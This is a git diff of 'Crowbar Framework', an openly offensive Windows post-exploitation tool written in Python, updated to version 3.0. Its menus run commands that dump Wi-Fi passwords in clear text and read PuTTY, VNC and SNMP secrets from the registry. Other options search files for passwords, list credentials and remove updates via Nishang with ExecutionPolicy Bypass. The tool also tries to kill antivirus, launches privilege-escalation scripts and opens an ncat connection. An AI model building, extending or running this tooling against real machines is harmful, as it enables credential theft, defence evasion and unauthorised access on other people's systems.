@@ -1,5 +1,5 @@
-# Crowbar
-# 4/15/2021
+# Crowbar Framework
+# 4/24/2021
 # Made by https://github.com/0x1CA3
 
 import os
@@ -17,7 +17,12 @@ import pyautogui
 from datetime import datetime
 from getmac import get_mac_address
 
-os.system("cls")
+def functionclear():
+    if os.name == "nt":
+        os.system("cls")
+    else:
+        os.system("clear")
+functionclear()
 
 ctypes.windll.kernel32.SetConsoleTitleW("[Crowbar Framework]")
 beginmen = socket.gethostname()
@@ -108,16 +113,10 @@ def leavescripts():
 # credit to https://github.com/d4vinci for some of the powershell scripts
 
 def scripts():
-    print(''' 
-    +——— Message ————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
-    | If a script by any chance happens to not work or you get no results, it's either because the target doesn't have what the script is        |
-    | trying to search for [Example: VNC Passwords from the registry] or the target doesn't have/meet the requirements.                          |
-    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+     
-    ''')
     while True:
         scripts = input("\nScripts (scripts/)\n  |==> ")
         if scripts == "help":
-            print(''' 
+            print('''
             +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
             | help - Prints out help commands.                                                                                                           |
             | list - Lists all the scripts.                                                                                                              |
@@ -135,16 +134,16 @@ def scripts():
             | 3.  scripts/regdump                                                             A script that dumps information from the registry.              |
             | 4.  scripts/AVKILL                                                              Script that attempts to kill the targets AntiVirus.             |
             | 5.  scripts/net/dumpwifipass                                                    Script that dumps Wi-Fi passwords.                              |
-            | 6.  scripts/vuln/eternal_blue [Nmap must be installed on target computer]       Checks if target machine is vulnerable to "Eternal Blue".       |  
+            | 6.  scripts/vuln/eternal_blue [Nmap must be installed on target computer]       Checks if target machine is vulnerable to "Eternal Blue".       |
             | 7.  scripts/vuln/netapi [Nmap must be installed on target computer]             Checks if target machine is vulnerable to "MS08-067". [Netapi]  |
             | 8.  scripts/getusers                                                            Gets all users registered on the target machine.                |
             | 9.  scripts/cmd/read_firewall_config                                            Gathers firewall information.                                   |
             | 10. scripts/cmd/read_registry_putty_sessions                                    Gather information and passwords from putty sessions.           |
             | 11. scripts/cmd/search_for_passwords                                            Searches for passwords on the target machine.                   |
             | 12. scripts/cmd/search_registry_for_passwords_cu                                Searches registry for passwords.                                |
-            | 13. scripts/cmd/read_registry_vnc_passwords                                     Searches the registry for VNC passwords.                        |  
+            | 13. scripts/cmd/read_registry_vnc_passwords                                     Searches the registry for VNC passwords.                        |
             | 14. scripts/cmd/read_registry_snmp_key                                          Query machine snmp key in the registry to get snmp parameters.  |
-            | 15. scripts/cmd/read_registry_run_key                                           Query the run key for the current user on the target machine.   |                                                                                                
+            | 15. scripts/cmd/read_registry_run_key                                           Query the run key for the current user on the target machine.   |
             | 16. scripts/cmd/list_network_shares                                             Lists all network shares.                                       |
             | 17. scripts/cmd/list_localgroups                                                Lists the local groups.                                         |
             | 18. scripts/cmd/list_drives                                                     List all drives.                                                |
@@ -154,16 +153,19 @@ def scripts():
             | 22. scripts/cmd/list_installed_updates                                          Lists installed updates.                                        |
             | 23. scripts/powershell/list_unqouted_services                                   Querying wmi to search for unquoted service paths.              |
             | 24. scripts/powershell/list_routing_tables                                      Lists current routing table.                                    |
-            | 25. scripts/powershell/list_network_interfaces                                  Lists network interface.                                        |                                                                 
-            | 26. scripts/powershell/list_installed_programs_using_registry                   Lists installed programs using the registry.                    |                                                                                                    
-            | 27. scripts/powershell/list_installed_programs_using_folders                    Lists installed programs using folders.                         |                                                                                              
+            | 25. scripts/powershell/list_network_interfaces                                  Lists network interface.                                        |
+            | 26. scripts/powershell/list_installed_programs_using_registry                   Lists installed programs using the registry.                    |
+            | 27. scripts/powershell/list_installed_programs_using_folders                    Lists installed programs using folders.                         |
             | 28. scripts/powershell/list_arp_tables                                          Lists ARP tables.                                               |
             | 29. scripts/powershell/get_iis_config                                           Fetches IIS config.                                             |
-            | 30. scripts/powershell/sensitive_data_search                                    A script that searches for files with sensitive data.           |                                                             
+            | 30. scripts/powershell/sensitive_data_search                                    A script that searches for files with sensitive data.           |
+            | 31. scripts/powershell/list_credentials                                         A script that lists credentials.                                |
+            | 32. scripts/powershell/remove_update [Nishang]                                  A payload that removes updates for the target machine.          |
+            | 33. scripts/powershell/get_unconstrained [Nishang]                              Script that finds machines with Unconstrained Delegation.       |
             +—————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
             ''')
         elif scripts == "clear":
-            os.system("cls")
+            functionclear()
         elif scripts == "hailmary":
             os.system("Netsh WLAN show profiles")
             print(f''' 
@@ -222,13 +224,17 @@ def scripts():
             subprocess.call('''powershell.exe Get-Content scripts/listarptables.ps1 | PowerShell.exe -noprofile -''', shell=True)
             subprocess.call('''powershell.exe Get-Content scripts/iisconfig.ps1 | PowerShell.exe -noprofile -''', shell=True)
             subprocess.call('''powershell.exe Get-Content scripts/sensitive_data_search.ps1 | PowerShell.exe -noprofile -''', shell=True)
+            subprocess.call('''powershell.exe Get-Content scripts/listcredentials.ps1 | PowerShell.exe -noprofile -''', shell=True)
+            subprocess.call('''powershell.exe Get-Content scripts/removeupdate.ps1 | PowerShell.exe -noprofile -''', shell=True)
+            subprocess.call('''(cd scripts) && (PowerShell.exe -ExecutionPolicy Bypass -File ./getunconstrained.ps1)''', shell=True)
             print(''' 
             +——— Message ————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
             | Hail mary finished!                                                                                                                        |
             +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
             ''')
         elif scripts == "back":
-            os.system("py main.py")
+            crowbarbanner()
+            mainmenuinput()
         elif scripts == "use 1":
             while True:
                 scriptsgrabwifi = input("\nScripts (scripts/net/grabwifi)\n  |==> ")
@@ -244,7 +250,7 @@ def scripts():
                 elif scriptsgrabwifi == "dump":
                     os.system("Netsh WLAN show profiles")
                 elif scriptsgrabwifi == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptsgrabwifi == "back":
                     leavescripts()
                 else:
@@ -274,7 +280,7 @@ def scripts():
                     +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                     ''')
                 elif scriptssysdump == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptssysdump == "back":
                     leavescripts()
                 else:
@@ -313,7 +319,7 @@ def scripts():
                     ———————————————————————————————————————————————————————————————''')
                     reg4()
                 elif scriptsregdump == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptsregdump == "back":
                     leavescripts()
                 else:
@@ -341,7 +347,7 @@ def scripts():
                     wifissid = input("\nScripts (Enter the network SSID which you want to dump passwords from)\n  |==> ")
                     os.system("NETSH WLAN SHOW PROFILE {} KEY=CLEAR".format(wifissid))
                 elif scriptswifipass == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptswifipass == "back":
                     leavescripts()
         elif scripts == "use 6":
@@ -359,7 +365,7 @@ def scripts():
                 elif scriptseternal == "vuln":
                     os.system("nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17–010 {}".format(localipaddress))
                 elif scriptseternal == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptseternal == "back":
                     leavescripts()
                 else:
@@ -379,7 +385,7 @@ def scripts():
                 elif scriptsnetapi == "vuln":
                     os.system("nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms08-067 {}".format(localipaddress))
                 elif scriptsnetapi == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptsnetapi == "back":
                     leavescripts()
                 else:
@@ -399,7 +405,7 @@ def scripts():
                 elif scriptsgetuser == "run":
                     os.system("NET users")
                 elif scriptsgetuser == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptsgetuser == "back":
                     leavescripts()
                 else:
@@ -419,7 +425,7 @@ def scripts():
                 elif scriptsfirewallcfg == "run":
                     os.system("netsh firewall show state & netsh firewall show config")
                 elif scriptsfirewallcfg == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptsfirewallcfg == "back":
                     leavescripts()
                 else:
@@ -439,7 +445,7 @@ def scripts():
                 elif scriptsreadregputty == "run":
                     os.system("reg query 'HKCU\Software\SimonTatham\PuTTY\Sessions'")
                 elif scriptsreadregputty == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptsreadregputty == "back":
                     leavescripts()
                 else:
@@ -459,7 +465,7 @@ def scripts():
                 elif scriptssearchpass == "run":
                     os.system("findstr /si password *.xml *.ini *.txt *.config")
                 elif scriptssearchpass == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptssearchpass == "back":
                     leavescripts()
                 else:
@@ -479,7 +485,7 @@ def scripts():
                 elif scriptsregisterypasswordcu == "run":
                     os.system('''REG QUERY HKCU /F "password" /t REG_SZ /S /K''')
                 elif scriptsregisterypasswordcu == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptsregisterypasswordcu == "back":
                     leavescripts()
                 else:
@@ -499,7 +505,7 @@ def scripts():
                 elif scriptsreadvncpass == "run":
                     os.system('''reg query "HKCU\Software\ORL\WinVNC3\Password"''')
                 elif scriptsreadvncpass == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptsreadvncpass == "back":
                     leavescripts()
                 else:
@@ -519,7 +525,7 @@ def scripts():
                 elif scriptssnmpkey == "run":
                     os.system('''reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"''')
                 elif scriptssnmpkey == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptssnmpkey == "back":
                     leavescripts()
                 else:
@@ -539,7 +545,7 @@ def scripts():
                 elif scriptsregrunkey == "run":
                     os.system("reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run")
                 elif scriptsregrunkey == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptsregrunkey == "back":
                     leavescripts()
                 else:
@@ -559,7 +565,7 @@ def scripts():
                 elif scriptsnetshares == "run":
                     os.system("net share")
                 elif scriptsnetshares == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptsnetshares == "back":
                     leavescripts()
                 else:
@@ -579,7 +585,7 @@ def scripts():
                 elif scriptslistlocalgroup == "run":
                     os.system("net localgroup")
                 elif scriptslistlocalgroup == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptslistlocalgroup == "back":
                     leavescripts()
                 else:
@@ -599,7 +605,7 @@ def scripts():
                 elif scriptslistdrive == "run":
                     os.system("wmic logicaldisk get caption,description,providername")
                 elif scriptslistdrive == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptslistdrive == "back":
                     leavescripts()
                 else:
@@ -619,7 +625,7 @@ def scripts():
                 elif scriptsgetsnmpcfg == "run":
                     os.system("reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s")
                 elif scriptsgetsnmpcfg == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptsgetsnmpcfg == "back":
                     leavescripts()
                 else:
@@ -639,7 +645,7 @@ def scripts():
                 elif scriptslistuserpriv == "run":
                     os.system("whoami /priv")
                 elif scriptslistuserpriv == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptslistuserpriv == "back":
                     leavescripts()
                 else:
@@ -659,7 +665,7 @@ def scripts():
                 elif scriptsreadservices == "run":
                     os.system("wmic service list brief")
                 elif scriptsreadservices == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptsreadservices == "back":
                     leavescripts()
                 else:
@@ -679,7 +685,7 @@ def scripts():
                 elif scriptslistinstalled == "run":
                     os.system("wmic qfe")
                 elif scriptslistinstalled == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptslistinstalled == "back":
                     leavescripts()
                 else:
@@ -699,7 +705,7 @@ def scripts():
                 elif scriptslistunquote == "run":
                     subprocess.call('''powershell.exe Get-Content scripts/unquoteservice.ps1 | PowerShell.exe -noprofile -''', shell=True)
                 elif scriptslistunquote == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptslistunquote == "back":
                     leavescripts()
                 else:
@@ -719,7 +725,7 @@ def scripts():
                 elif scriptsroutingtable == "run":
                     subprocess.call('''powershell.exe Get-Content scripts/routingtable.ps1 | PowerShell.exe -noprofile -''', shell=True)
                 elif scriptsroutingtable == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptsroutingtable == "back":
                     leavescripts()
                 else:
@@ -739,7 +745,7 @@ def scripts():
                 elif scriptsnetworkinter == "run":
                     subprocess.call('''powershell.exe Get-Content scripts/listnetworkinter.ps1 | PowerShell.exe -noprofile -''', shell=True)
                 elif scriptsnetworkinter == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptsnetworkinter == "back":
                     leavescripts()
                 else:
@@ -759,7 +765,7 @@ def scripts():
                 elif scriptslistinstalledproreg == "run":
                     subprocess.call('''powershell.exe Get-Content scripts/listprogramsreg.ps1 | PowerShell.exe -noprofile -''', shell=True)
                 elif scriptslistinstalledproreg == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptslistinstalledproreg == "back":
                     leavescripts()
                 else:
@@ -779,7 +785,7 @@ def scripts():
                 elif scriptslistinstalledprofol == "run":
                     subprocess.call('''powershell.exe Get-Content scripts/listprogramsfol.ps1 | PowerShell.exe -noprofile -''', shell=True)
                 elif scriptslistinstalledprofol == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptslistinstalledprofol == "back":
                     leavescripts()
                 else:
@@ -799,7 +805,7 @@ def scripts():
                 elif scriptslistarptables == "run":
                     subprocess.call('''powershell.exe Get-Content scripts/listarptables.ps1 | PowerShell.exe -noprofile -''', shell=True)
                 elif scriptslistarptables == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptslistarptables == "back":
                     leavescripts()
                 else:
@@ -819,7 +825,7 @@ def scripts():
                 elif scriptsgetiisconfig == "run":
                     subprocess.call('''powershell.exe Get-Content scripts/iisconfig.ps1 | PowerShell.exe -noprofile -''', shell=True)
                 elif scriptsgetiisconfig == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptsgetiisconfig == "back":
                     leavescripts()
                 else:
@@ -839,8 +845,73 @@ def scripts():
                 elif scriptssensitivedata == "run":
                     subprocess.call('''powershell.exe Get-Content scripts/sensitive_data_search.ps1 | PowerShell.exe -noprofile -''', shell=True)
                 elif scriptssensitivedata == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif scriptssensitivedata == "back":
+                    leavescripts()
+                else:
+                    print("Wrong Command!")
+        elif scripts == "use 31":
+            while True:
+                scriptslistcreden = input("\nScripts (scripts/powershell/list_credentials)\n  |==> ")
+                if scriptslistcreden == "help":
+                    print(''' 
+                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    | help - Prints out help commands.                                                                                                           |
+                    | run - Runs the script against the host machine.                                                                                            |
+                    | clear - Clears the screen.                                                                                                                 |
+                    | back - goes back to the 'Scripts' directory.                                                                                               |
+                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    ''')
+                elif scriptslistcreden == "run":
+                    subprocess.call('''powershell.exe Get-Content scripts/listcredentials.ps1 | PowerShell.exe -noprofile -''', shell=True)
+                elif scriptslistcreden == "clear":
+                    os.system("cls")
+                elif scriptslistcreden == "back":
+                    leavescripts()
+                else:
+                    print("Wrong Command!")
+        elif scripts == "use 32":
+            while True:
+                scriptsremoveupdate = input("\nScripts (scripts/powershell/remove_update)\n  |==> ")
+                if scriptsremoveupdate == "help":
+                    print(''' 
+                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    | help - Prints out help commands.                                                                                                           |
+                    | run - Runs the script against the host machine.                                                                                            |
+                    | clear - Clears the screen.                                                                                                                 |
+                    | back - goes back to the 'Scripts' directory.                                                                                               |
+                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    ''')
+                elif scriptsremoveupdate == "run":
+                    subprocess.call('''powershell.exe Get-Content scripts/removeupdate.ps1 | PowerShell.exe -noprofile -''', shell=True)
+                    print(''' 
+                    +——— Message ————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    | Updates removed!                                                                                                                           |
+                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    ''')
+                elif scriptsremoveupdate == "clear":
+                    os.system("cls")
+                elif scriptsremoveupdate == "back":
+                    leavescripts()
+                else:
+                    print("Wrong Command!")
+        elif scripts == "use 33":
+            while True:
+                scriptsgetunconstrained = input("\nScripts (scripts/powershell/get_unconstrained)\n  |==> ")
+                if scriptsgetunconstrained == "help":
+                    print(''' 
+                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    | help - Prints out help commands.                                                                                                           |
+                    | run - Runs the script against the host machine.                                                                                            |
+                    | clear - Clears the screen.                                                                                                                 |
+                    | back - goes back to the 'Scripts' directory.                                                                                               |
+                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    ''')
+                elif scriptsgetunconstrained == "run":
+                    subprocess.call('''(cd scripts) && (PowerShell.exe -ExecutionPolicy Bypass -File ./getunconstrained.ps1)''', shell=True)
+                elif scriptsgetunconstrained == "clear":
+                    os.system("cls")
+                elif scriptsgetunconstrained == "back":
                     leavescripts()
                 else:
                     print("Wrong Command!")
@@ -850,6 +921,7 @@ def scripts():
 
 def leaveutil():
     util()
+
 
 def util():
     while True:
@@ -873,12 +945,14 @@ def util():
             | 4. util/extra/avtrigger [Golang must be installed on target machine]            Triggers targets AntiVirus [if enabled] with a video.           |
             | 5. util/imonitor                                                                A utility for task monitoring.                                  |
             | 6. util/ipv4                                                                    Grabs IPv4 of target machine.                                   |
+            | 7. util/netcat [NetCat must be installed on the target machine]                 Starts netcat listener.                                         |
             +—————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
             ''')
         elif util == "clear":
-            os.system("cls")
+            functionclear()
         elif util == "back":
-            os.system("py main.py")
+            crowbarbanner()
+            mainmenuinput()
         elif util == "use 1":
             print('''
             +——— Message ————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+ 
@@ -916,10 +990,12 @@ def util():
                         | Scan complete!                                                                                                                             |
                         +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                         ''')
+                    else:
+                        print("Wrong Command!")
                 elif utilnmap == "back":
                     leaveutil()
                 elif utilnmap == "clear":
-                    os.system("cls")
+                    functionclear()
                 else:
                     print("Wrong Command!")
         elif util == "use 3":
@@ -937,7 +1013,7 @@ def util():
                 elif utilss == "capture":
                     os.system("py util/screencapture.py")
                 elif utilss == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif utilss == "back":
                     leaveutil()
                 else:
@@ -962,7 +1038,7 @@ def util():
                     +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                     ''')
                 elif utilavtrig == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif utilavtrig == "back":
                     leaveutil()
         elif util == "use 5":
@@ -984,7 +1060,7 @@ def util():
                     +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                     ''')
                 elif utilimonitor == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif utilimonitor == "back":
                     leaveutil()
                 elif utilimonitor == "tasklist":
@@ -1017,14 +1093,48 @@ def util():
                 elif utilipv4 == "track":
                     print(iptrack)
                 elif utilipv4 == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif utilipv4 == "back":
                     leaveutil()
                 else:
                     print("Wrong Command!")
+        elif util == "use 7":
+            while True:
+                utilnetcat = input("\nUtil (util/netcat)\n  |==> ")
+                if utilnetcat == "help":
+                    print(''' 
+                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    | help - Prints out help commands.                                                                                                           | 
+                    | listen - Gets the target machines IP address.                                                                                              |
+                    | clear - Clears the screen.                                                                                                                 |
+                    | back - Goes back to the 'Util' directory.                                                                                                  |
+                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    ''')
+                elif utilnetcat == "listen":
+                    utilnetcatoption = input("\nUtil (Do you want to start the listener with default settings? y or n)\n  |==> ")
+                    if utilnetcatoption == "Y" or utilnetcatoption == "y":
+                        utilnetcatoptionyes = input("\nUtil (Type in IP)\n  |==> ")
+                        utilnetcatoptionyes1 = input("\nUtil (Type in Port)\n  |==> ")
+                        print(''' 
+                        +——— Message ————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                        | Listener started!                                                                                                                          |
+                        +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                        ''')
+                        os.system("ncat -nv {} {}".format(utilnetcatoptionyes, utilnetcatoptionyes1))
+                    elif utilnetcatoption == "N" or utilnetcatoption == "n":
+                        utilnetcatoptionno = input("\nUtil (Type in custom command)\n  |==> ")
+                        os.system("{}".format(utilnetcatoptionno))
+                    else:
+                        print("Wrong Command!")
+                elif utilnetcat == "clear":
+                    os.system("cls")
+                elif utilnetcat == "back":
+                    leaveutil()
+                else:
+                    print("Wrong Command!")
         else:
-            print("Wrong Command!")  
-
+            print("Wrong Command!")
+                    
 
 def icommand():
     print(''' 
@@ -1036,10 +1146,12 @@ def icommand():
     while True:
         icommandin = input("\niCommand (Type the command you want execute)\n  |==> ")
         if icommandin == "clear":
-            os.system("cls")
+            functionclear()
         elif icommandin == "back":
-            os.system("py main.py")
+            crowbarbanner()
+            mainmenuinput()
         os.system("{}".format(icommandin))
+
 
 def ipower():
     print(''' 
@@ -1051,9 +1163,10 @@ def ipower():
     while True:
         ipower = input("\niPower (Type the command you want execute)\n  |==> ")
         if ipower == "clear":
-            os.system("cls")
+            functionclear()
         elif ipower == "back":
-            os.system("py main.py")
+            crowbarbanner()
+            mainmenuinput()
         os.system("powershell {}".format(ipower))    
 
 # credits to https://github.com/M4ximuss/ for the 'powerless' script
@@ -1062,6 +1175,7 @@ def ipower():
 
 def leaveescalate():
     escalate()
+
 
 def escalate():
     while True:
@@ -1085,9 +1199,10 @@ def escalate():
             +—————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+            
             ''')
         elif escalate == "clear":
-            os.system("cls")
+            functionclear()
         elif escalate == "back":
-            os.system("py main.py")
+            crowbarbanner()
+            mainmenuinput()
         elif escalate == "use 1":
             while True:
                 escalatewinpeas = input("\nEscalate (escalate/winpeas)\n  |==> ")
@@ -1104,7 +1219,7 @@ def escalate():
                     os.system("cd escalate && winPEAS.bat")
                     ctypes.windll.kernel32.SetConsoleTitleW("[Crowbar Framework]")
                 elif escalatewinpeas == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif escalatewinpeas == "back":
                     leaveescalate()
                 else:
@@ -1124,7 +1239,7 @@ def escalate():
                 elif escalatepowerless == "scan":
                     os.system("cd escalate && Powerless.bat")
                 elif escalatepowerless == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif escalatepowerless == "back":
                     leaveescalate()
                 else:
@@ -1144,7 +1259,7 @@ def escalate():
                 elif escalatewinprivesc == "run":
                     os.system("cd escalate && winprivesc.bat")
                 elif escalatewinprivesc == "clear":
-                    os.system("cls")
+                    functionclear()
                 elif escalatewinprivesc == "back":
                     leaveescalate()
                 else:
@@ -1153,20 +1268,19 @@ def escalate():
             print("Wrong Command!")
 
 
-
 def mainmenuinput():
     while True:
         mainmenu = input("\nuser@crowbar:~# ")
         if mainmenu == "help":
             print('''
-            +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+ 
+            +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
             | help - Prints out help commands. (This is for the entire framework)                                                                        |
-            | dir util - Goes into the 'Util' directory.                                                                                                 |   
+            | dir util - Goes into the 'Util' directory.                                                                                                 |
             | dir scripts - Goes into the 'Scripts' directory.                                                                                           |
             | dir escalate - Goes into the 'Escalate' directory.                                                                                         |
             | command - Loads the 'iCommand' tool for executing OS commands via CMD.                                                                     |
             | power - Loads the 'iPower' tool for executing OS commands via PowerShell.                                                                  |
-            | crowbar - Reloads the framework.                                                                                                           |           
+            | crowbar - Reloads the framework.                                                                                                           |
             | clear - Clears the screen. (This is for the entire framework)                                                                              |
             +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
             ''')
@@ -1183,12 +1297,14 @@ def mainmenuinput():
         elif mainmenu == "crowbar":
             os.system("py main.py")
         elif mainmenu == "clear":
-            os.system("cls")
+            functionclear()
         else:
             print("Wrong Command!")
 
 
-print(f''' 
+def crowbarbanner():
+    functionclear()
+    print(f''' 
     ▄█▄    █▄▄▄▄ ████▄   ▄ ▄   ███   ██   █▄▄▄▄ 
     █▀ ▀▄  █  ▄▀ █   █  █   █  █  █  █ █  █  ▄▀ 
     █   ▀  █▀▀▌  █   █ █ ▄   █ █ ▀ ▄ █▄▄█ █▀▀▌  
@@ -1198,19 +1314,21 @@ print(f'''
                                   ▀ 
 
               Welcome {beginmen}
-             to the Crowbar Framework.
-''')
+            to the Crowbar Framework.
+    ''')
 
-print(''' 
+    print(''' 
     +——— Crowbar ——————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
-    | Version: 2.6                                                                                                                             |
-    | Scripts: 33                                                                                                                              |
-    | Utilities: 6                                                                                                                             |
+    | Version: 3.0                                                                                                                             |
+    | Scripts: 36                                                                                                                              |
+    | Utilities: 7                                                                                                                             |
     | Made by: https://github.com/0x1CA3                                                                                                       |
     |                                                                                                                                          |
     | Total Online Services: 2                                                                                                                 |
     | https://vpnapi.io/api/                                                                                                                   |
     | https://ipv4bot.whatismyipaddress.com/                                                                                                   |
     +——————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
-''')
+    ''')
+
+crowbarbanner()
 mainmenuinput()
